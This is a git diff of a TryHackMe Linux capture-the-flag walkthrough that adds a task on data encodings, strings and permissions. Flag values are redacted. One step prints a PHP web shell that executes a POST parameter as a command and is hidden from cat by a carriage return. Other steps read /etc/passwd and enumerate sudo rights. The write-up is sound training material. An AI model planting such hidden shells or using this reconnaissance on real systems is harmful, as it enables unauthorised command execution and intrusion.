@@ -5,6 +5,7 @@ Link: https://tryhackme.com/room/linuxctf
 * [Task 1: Linux Challenges Intro](#task-1-linux-challenges-intro)
 * [Task 2: The Basics](#task-2-the-basics)
 * [Task 3: Linux Functionality](#task-3-linux-functionality)
+* [Task 4: Data Representation, Strings and Permissions](#task-4-data-representation-strings-and-permissions)
 
 ## Task 1: Linux Challenges Intro
 Explains the purpose of this room, some of the commands and techniques you'll be expected to use, and how to deploy the machine
@@ -244,7 +245,7 @@ Find all other users on the system. What is flag 10.
 
 #### Steps
 The best way to look at all the users on a Linux system is to look in the */etc/passwd* file.
-```
+<pre>
 bob@ip-10-10-132-59:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -278,7 +279,7 @@ sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
 pollinate:x:111:1::/var/cache/pollinate:/bin/false
 ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 bob:x:1001:1001:Bob,,,:/home/bob:/bin/bash
-<flag 10 was here>:x:1002:1002:,,,:/home/<flag 10 was here>:/bin/bash
+<b>&lt;flag 10 was here&gt;</b>:x:1002:1002:,,,:/home/&lt;flag 10 was here&gt;:/bin/bash
 alice:x:1003:1003:,,,:/home/alice:/bin/bash
 mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
 xrdp:x:113:118::/var/run/xrdp:/bin/false
@@ -297,7 +298,7 @@ usbmux:x:125:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
 gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
 garry:x:1004:1006:,,,:/home/garry:/bin/bash
 bob@ip-10-10-132-59:~$
-```
+</pre>
 #### Answer
 > &lt;flag 10 was a username&gt;
 
@@ -352,6 +353,7 @@ if ! shopt -oq posix; then
 fi
 bob@ip-10-10-197-121:~$
 ```
+The flag was in the comment for the *flag11* alias.
 #### Answer
 > &lt;flag 11 from above&gt;
 
@@ -359,7 +361,7 @@ bob@ip-10-10-197-121:~$
 Flag12 is located were MOTD's are usually found on an Ubuntu OS. What is flag12?
 
 #### Steps
-On Ubuntu, the Message of The Day (MOTD) is stored in */etc/update-motd.d/*, though it can sometimes be in */etc/motd* if there is a custom directory. These directories often store a set of files that go together to make the final message. Let's see what we have on the system:
+On Ubuntu, the Message of The Day (MOTD) is stored in */etc/update-motd.d/*, though it can sometimes be in */etc/motd* if there is a custom directory. These directories often store a set of files that go together to make the final message. We can `grep` these files for the word *flag*. Let's see what we have on the system:
 ```
 ob@ip-10-10-197-121:~$ ls /etc/update-motd.d/
 00-header     51-cloudguest         91-release-upgrade  98-fsck-at-reboot   99-esm
@@ -533,6 +535,7 @@ alice@ip-10-10-197-121:~$
 Find the hidden flag 18.
 
 #### Steps
+Hidden files on Linux usually start with a dot (`.`). `ls` on its own doesn't show these files, but by passing the `-a` flag, the hidden files are shown. `-la` (or `-al`) is a common flag set to pass to `ls` which shows file details plus hidden files. One we find a hidden flag 18 file, we can use `cat` to take a look.
 ```
 alice@ip-10-10-197-121:~$ ls -la
 total 172
@@ -564,7 +567,7 @@ alice@ip-10-10-197-121:~$
 Read the 2345th line of the file that contains flag 19.
 
 #### Steps
-We can use the `sed` Stream EDitor command with the `-n` flag to suppress the output of every line not matching the pattern, with `'2345p'` being used to match and output the specified line number(s).
+We can use the `sed` [Stream EDitor](https://en.wikipedia.org/wiki/Sed) command with the `-n` flag to suppress the output of every line not matching the pattern, with `'2345p'` being used to match and output the specified line number(s).
 ```
 alice@ip-10-10-197-121:~$ sed -n '2345p' flag19
 <flag 19 was here>
@@ -572,3 +575,244 @@ alice@ip-10-10-197-121:~$
 ```
 #### Answer
 > &lt;flag 19 from above&gt;
+
+## Task 4: Data Representation, Strings and Permissions
+This set of tasks will require you to understand how certain data is represented on a Linux system. This section may require you to do some independent research.
+
+> *Author's note: I started Task 4 by using `ls` in each of our known users' home directories so I could see where most of the flags were*
+
+### Question 1
+Find and retrieve flag 20.
+
+#### Steps
+An `ls` of */home/alice* shows the file *flag20*. Let's have a look at it.
+```
+alice@ip-10-10-214-98:~$ ls
+flag17  flag19  flag20  flag22  flag23  flag32.mp3
+alice@ip-10-10-214-98:~$ cat flag20
+MDJiOWFhYjhhMjk5NzBkYjA4ZWM3N2FlNDI1ZjZlNjg=
+alice@ip-10-10-214-98:~$
+```
+Flags have previously been hexadecimal numbers, so the contents of *flag20* doesn't look like our flag. However, when I see and `=` at the end of a string of alphanumeric characters, it suggests that the string is [base64](https://en.wikipedia.org/wiki/Base64) encoded (the `=` character is used for padding in *base64* strings). We can decode it in Linux with the `base64` command, using the `-d` flag.
+```
+alice@ip-10-10-214-98:~$ base64 -d flag20 ; echo
+<flag20 was here>
+alice@ip-10-10-214-98:~$
+```
+#### Answer
+> &lt;flag 20 from above&gt;
+
+### Question 2
+Inspect the flag21.php file. Find the flag.
+
+#### Steps
+The *flag21.php* file is found in */home/bob*.
+```
+alice@ip-10-10-214-98:~$ ls /home/bob/
+Desktop  Documents  Downloads  flag13  flag21.php  flag2.txt  flag8.tar.gz  Music  Pictures  Public  Templates  Videos
+alice@ip-10-10-214-98:~$ cat /home/bob/flag21.php
+<?='MoreToThisFileThanYouThink';?>
+alice@ip-10-10-214-98:~$
+```
+There must be some text hidden in this file that a simple `cat` can't see. We'll take a look in a text editor.
+```
+alice@ip-10-10-214-98:~$ vim /home/bob/flag21.php
+<?=`$_POST[flag21_<flag 21 was here>]`?>^M<?='MoreToThisFileThanYouThink';?>
+~
+~   
+```
+When we look at it in `vim` (other text editors may show this, too - I haven't tested them), we can see that there is a `^M` character in the text. This is a carriage return, and moves the cursor back to the beginning of the line. This means that the part of the line after the `^M` overwrites the first part of the line before the `^M` on the console, hiding it when we use `cat`.
+
+The flag was in the first part of the line.
+#### Answer
+> &lt;flag 21 from above&gt;
+
+### Question 3
+Locate and read flag 22. Its represented as hex.
+
+#### Steps
+Flag 22 is in *alice*'s home directory.
+```
+alice@ip-10-10-8-228:~$ ls
+flag17  flag19  flag20  flag22  flag23  flag32.mp3
+alice@ip-10-10-8-228:~$ cat flag22
+39 64 31 61 65 38 64 35 36 39 63 38 33 65 30 33 64 38 61 38 66 36 31 35 36 38 61 30 66 61 37 64
+alice@ip-10-10-8-228:~$
+```
+The question says that this is [hex](https://en.wikipedia.org/wiki/Hexadecimal) (often represented with a leading `0x`, though not here), and we notice that the values seem to fall within the [ASCII](https://en.wikipedia.org/wiki/ASCII) range for the numbers *0* to *9* (`0x30` to `0x39`) and the letters *a* to *f* (`0x61` to `0x66`). We can test this easily by taking the line from the file, converting it in a column by replacing spaces with newlines (`\n`) using `tr`, and sorting them with `sort`. We can also use `uniq` to take duplicates out of the list to make it easier to scan
+```
+alice@ip-10-10-8-228:~$ cat flag22 | tr -s ' ' '\n' | sort | uniq
+30
+31
+33
+35
+36
+37
+38
+39
+61
+63
+64
+65
+66
+alice@ip-10-10-8-228:~$
+```
+> *Author's note: The above command line isn't necessary to solve this - we could just read the numbers in the file, but I always like to find an easy way to check things!
+
+We can see that what we guessed was true above is. So now we can take these numbers, turn them into their ASCII character representation, and, hopefully, this will be our flag.
+
+To convert hex to ASCII, we could just use an online [ASCII table](http://www.asciitable.com/) and convert each character by hand to get the flag. However, Linux provides a command ([`xxd`](https://linux.die.net/man/1/xxd)) that converts between hex values and their binary representation. By default, `xxd` converts a binary file to its hex value, but by using the `-r` flag, we can reverse that operation.
+
+We can write a bash command line, using a [`for` loop](https://www.cyberciti.biz/faq/bash-for-loop/) to pass each hex number from the file to `xxd` and convert it. We need to add the `0x` hex representation marker to the front of each number for `xxd`.
+```
+alice@ip-10-10-8-228:~$ for i in $(cat flag22); do echo 0x$i | xxd -r ; done ; echo
+<flag22 was here>
+alice@ip-10-10-8-228:~$
+```
+#### Answer
+> &lt;flag 22 from above&gt;
+
+### Question 4
+Locate, read and reverse flag 23.
+
+#### Steps
+Flag 23 is in *alice*'s home directory.
+```
+alice@ip-10-10-8-228:~$ ls
+flag17  flag19  flag20  flag22  flag23  flag32.mp3
+alice@ip-10-10-8-228:~$ cat flag23
+5ffb258330b8437a090c4f66507925ae
+alice@ip-10-10-8-228:~$
+```
+We need to reverse this to get the flag. Linux has a command `rev` which does just this - reverses the string passed to it.
+```
+alice@ip-10-10-8-228:~$ cat flag23 | rev
+<flag 23 was here>
+alice@ip-10-10-8-228:~$
+```
+#### Answer
+> &lt;flag 23 from above&gt;
+
+### Question 5
+Analyse the flag 24 compiled C program. Find a command that might reveal human readable strings when looking in the source code.
+
+#### Steps
+Flag 24 is in *garry*'s home directory. The *alice* user can run it, though, so no need to change users yet.
+```
+alice@ip-10-10-171-5:~$ ls ../garry/
+flag1.txt  flag24  flag29
+alice@ip-10-10-171-5:~$ ../garry/flag24
+Nothing to see here!!alice@ip-10-10-171-5:~$
+alice@ip-10-10-171-5:~$
+```
+Linux has a command `strings` that can show you all the ASCII strings in a binary. We can run strings over the `flag24` executable and `grep` for teh word *flag*.
+```
+alice@ip-10-10-171-5:~$ strings ../garry/flag24 | grep -i flag
+flag24.c
+flag_24_is_<flag 24 was here>
+alice@ip-10-10-171-5:~$
+```
+#### Answer
+> &lt;flag 24 from above&gt;
+
+### Question 6
+Flag 25 does not exist.
+
+There's nothing to do here. Just click the *Completed* button.
+
+### Question 7
+Find flag 26 by searching the all files for a string that begins with 4bceb and is 32 characters long. 
+
+#### Steps
+We can use `find` to search for all files on the system. The option `-type f` means we'll only find files. We will start by searching only small files, as searching the contents of every file can take a long time. The max size of files to find can be specified with the `-size` option. We will start with `-size 1k`. Once the files have been found, we want to run `grep` on them. To run a command on each file found by `find`, we can add the `-exec` option and specify the command we want to run, terminating with a `\;`. Our command will be `grep -Il "4bceb" {}`. Here, the `-I` option stops `grep` from searching inside binary files, the `-l` option makes `grep` only show the file names, not the contents it found (this can be better if there are a lot of results), and, after the search string, the `{}` will be replaced by the path of the file found by `find`.
+
+To stop a lot of *Permission denied* and other errors appearing at the command line, making it difficult to see the actual results, we'll send the error stream (`2`) to `/dev/null` (i.e. to nowhere so they're not displayed).
+```
+alice@ip-10-10-171-5:~$ find / -type f -size 1k -exec grep -Il "4bceb" {} \; 2>/dev/null
+/var/cache/apache2/mod_cache_disk/config.json
+alice@ip-10-10-171-5:~$ cat /var/cache/apache2/mod_cache_disk/config.json
+flag twenty6
+
+<flag 26 was here>
+alice@ip-10-10-171-5:~$
+```
+Luckily, there was only one file containing that series of characters, so we didn't need to worry about complicating the search with the length of the string.
+#### Answer
+> &lt;flag 26 from above&gt;
+
+### Question 8
+Locate and retrieve flag 27, which is owned by the root user.
+
+#### Steps
+The *flag27* file wasn't any of the user directories we know of. However, when I looked in */home* to see if there were any other directories there, I could see the file at that level. The file is owned by *root*, and only *root* has permissions on it
+```
+alice@ip-10-10-171-5:~$ ls -la /home
+total 296
+drwxr-xr-x  6 root   root     4096 Feb 20  2019 .
+drwxr-xr-x 23 root   root     4096 Oct 17 14:35 ..
+drwxr-xr-x  4 alice  alice    4096 Oct 17 14:59 alice
+drwxr-xr-x 21 bob    bob      4096 Feb 20  2019 bob
+-rwx------  1 root   root       33 Feb 19  2019 flag27
+-rwxr-xr-x  1 root   root   272364 Feb 18  2019 flag6.txt
+drwxr-xr-x  3 garry  garry    4096 Feb 20  2019 garry
+drwxr-xr-x 19 ubuntu ubuntu   4096 Mar  7  2019 ubuntu
+alice@ip-10-10-171-5:~$
+```
+If we had a user that has [`sudo`](https://en.wikipedia.org/wiki/Sudo) access, we could view the file as if we were *root*. A way to find out which users have `sudo` privileges is to look in the */etc/group* file. This file lists which users are members of which groups. We can use `grep` to find all users who are members of `sudo`.
+```
+alice@ip-10-10-171-5:~$ grep sudo /etc/group
+sudo:x:27:ubuntu
+alice@ip-10-10-171-5:~$
+```
+We don't have a password for this *ubuntu* user that has `sudo` privileges. There is one other option before we go searching for the password for *ubuntu*. `sudo` also allows some users to run specific commands with elevated privileges. We can see what commands each of our users can run with `sudo -l`.
+```
+alice@ip-10-10-207-54:~$ sudo -l
+Matching Defaults entries for alice on ip-10-10-207-54.eu-west-1.compute.internal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on ip-10-10-207-54.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: /bin/cat /home/flag27
+alice@ip-10-10-207-54:~$
+```
+We got lucky, and the user we're logged in as (*alice*) is able to run the exact command we need! There's no need to check the other users, we can just run out `cat` commands using `sudo`.
+```
+alice@ip-10-10-207-54:~$ sudo cat /home/flag27
+<flag 27 was here>
+alice@ip-10-10-207-54:~$
+```
+#### Answer
+> &lt;flag 27 from above&gt;
+
+### Question 9
+Whats the linux kernel version?
+
+#### Steps
+We can simply display the Linux kernel version using `uname -r`.
+```
+alice@ip-10-10-207-54:~$ uname -r
+4.4.0-1075-aws
+alice@ip-10-10-207-54:~$
+```
+#### Answer
+> 4.4.0-1075-aws
+
+### Question 10
+Find the file called flag 29 and do the following operations on it:
+
+1. Remove all spaces in file.
+2. Remove all new line spaces.
+3. Split by comma and get the last element in the split.
+
+#### Steps
+The file *flag29* can be found in the home directory of the user *garry*.
+
+We can use the *translate* command `tr` remove both the spaces and the new lines. Using `tr` with the `-d` (delete) flag tell it to remove specified chacters from the input string. We can pass the contents of *flag29* to it using `cat`.
+
+To split at the comma and get the last element, we can use `cut`. `cut` will split a string at a specified delimiter (using the `-d` flag), and then return the field (or column) you specify with the `-f` flag. Unfortunately, the `-f` flag requires the field number, and we don't know how many fields the string will split into. The best was to get around this is to reverse the string with `rev`, then use `cut` with `-d,` to split at commas and `-f1` to get the first field. Finally, use `rev` again to put the final string back the right way around.
+```
+alice@ip-10-10-207-54:~$ cat /home/garry/flag29 | tr -d " \n\r" | rev | cut -d, -f1 | rev
+<flag 29 was here>
+alice@ip-10-10-207-54:~$
+```
+#### Answer
+> &lt;flag 29 from above&gt;
